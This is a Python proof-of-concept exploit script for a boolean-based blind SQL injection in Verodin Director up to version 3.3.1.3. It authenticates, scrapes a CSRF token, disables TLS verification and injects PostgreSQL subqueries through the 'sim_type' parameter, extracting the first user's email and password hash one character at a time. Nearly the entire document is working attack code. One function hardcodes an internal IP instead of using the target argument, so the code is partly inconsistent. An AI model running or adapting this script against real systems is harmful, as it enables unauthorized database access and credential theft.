# Exploit:      Verodin SQL injection (boolean-based blind)
# Target:       Verodin Director <= v3.3.1.3
# Vendor:       http://www.verodin.com/
# Author:       Jeff Barbi
# Description:  PoC, dumps first username and password from the public.users table.

import os
import sys
import urllib
import string
import ssl
import itertools as it
import mechanize

# taste the rainbow
class bcolors:
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# disable HTTPS cert check
try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context

if len(sys.argv) < 4:
    print bcolors.FAIL + '[+] ' + bcolors.ENDC + 'USAGE: python2 veropwn.py <director ip> <username> <password>'
    quit()

# creds for Verodin Director (any valid user)
username = sys.argv[2]
password = sys.argv[3]

def authenticate(username, password):
    # request the login page, grab CSRF token
    url = 'https://' + str(sys.argv[1]) + '/users/sign_in'
    request = mechanize.Request(url)
    response = mechanize.urlopen(request)
    responseData = response.read()
    tokenIndex = responseData.find('authenticity_token')
    CSRFtoken = responseData[tokenIndex:tokenIndex+100].split('=')[2].strip('\"') + '='
    
    # data for POST auth
    data = urllib.urlencode({'utf8':'\xE2\x9C\x93',
        'authenticity_token':CSRFtoken,
        'user[email]':username,
        'user[password]':password,
        'user[remember_me]':'0',
        'commit':'Sign+in'}) # this can be removed, auth still works
    # print bcolors.WARNING + '[+] ' + bcolors.ENDC + 'Using data:\n' + data
    
    # POST our creds and CSRF token
    request2 = mechanize.Request(url, data)
    response2 = mechanize.urlopen(request2)

    if 'Forgot your password?' not in response2.read():
        return True
    else:
        return False

def postgres(query):
    expression = '%27%29%20AND%20' + query
    r = 'https://10.244.123.19/simulations.json?sim_type=eval' + expression

    req = mechanize.Request(r)
    gcontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
    resp = mechanize.urlopen(req)
    response = resp.read()
    
    if  len(response) < 500: # SQL query was false
        return False
    elif len(response) > 25000: # SQL query was true
        return True
    else:
        print response
        # quit()

def get(field, table):
    # url containing vulnerable param 'sim_type'
    url = 'https://' + sys.argv[1] + '/simulations.json?sim_type=eval'

    # Find length of a field
    pos = 1
    print bcolors.WARNING + bcolors.BOLD + '[+] ' + bcolors.ENDC + 'Finding length of field \"' + field + '\" at index ' + str(pos-1)
    length = 20
    while True:
        query = "(SELECT%20CHAR_LENGTH(" + field + ")%20FROM%20public.users%20LIMIT%201%20OFFSET%20" + str(pos) + ")%3D" + str(length) + "%20AND%20(%27gqyn%27%3D%27gqyn"
        isTrue = postgres(query)
        # print query + " IS " + str(isTrue)
        if isTrue:
            break
        else:
            length+=1
    print bcolors.OKGREEN + bcolors.BOLD + '[+] ' + bcolors.ENDC + 'Found length: ' + str(length) + '\n'

    # ASCII character codes to use
    symbols = range(32, 47)
    digits = range(48, 57)
    charsUpper = range(64, 90)
    charsLower = range(97, 122)
    charRange = []
    for i in it.chain(charsLower, symbols, charsUpper, digits):
        charRange.append(i)

    # Find each character in a field
    result = ""
    isTrue = False

    print bcolors.WARNING + bcolors.BOLD + '[+] ' + bcolors.ENDC + 'Getting data:'
    while pos <= length:
        for c in charRange:
            query = "ASCII(SUBSTRING((SELECT%20" + field + "%20FROM%20public.users%20ORDER%20BY%20email%20OFFSET%200%20LIMIT%201)%3A%3Atext%20FROM%20" + str(pos) + "%20FOR%201))%3D" + str(c) + "%20AND%20(%27gqyn%27%3D%27gqyn"
            isTrue = postgres(query)
            if isTrue:
                print bcolors.OKGREEN + bcolors.BOLD + '[+] ' + bcolors.ENDC + 'Found character ' + str(pos) + ' of ' + str(length)
                result += str(chr(c))
                print bcolors.OKGREEN + bcolors.BOLD + '[+] ' + bcolors.ENDC + 'Current string: ' + bcolors.BOLD + result + bcolors.ENDC
                pos += 1
                break
        if not isTrue:
            print bcolors.FAIL + bcolors.BOLD + '[+] ' + bcolors.ENDC + 'Something went wrong ... position ' + str(pos) + ' character is not known within character set\n'
            break
    return result

print bcolors.WARNING + bcolors.BOLD + '[+] ' + bcolors.ENDC + 'Authenticating as \"' + username + '\"'
if authenticate(username, password):
    print bcolors.OKGREEN + bcolors.BOLD + '[+] ' + bcolors.ENDC + 'Successful!\n'
else:
    print bcolors.FAIL + bcolors.BOLD + '[+] ' + bcolors.ENDC + 'Failed :('

userResult = get("email", "public.users")
passResult = get("encrypted_password", "public.users")
print '\n' + bcolors.OKGREEN + bcolors.BOLD + '[+] ' + bcolors.ENDC + 'Retrieved username: ' + bcolors.BOLD + userResult + bcolors.ENDC + '\n'
print '\n' + bcolors.OKGREEN + bcolors.BOLD + '[+] ' + bcolors.ENDC + 'Retrieved password: ' + bcolors.BOLD + passResult + bcolors.ENDC
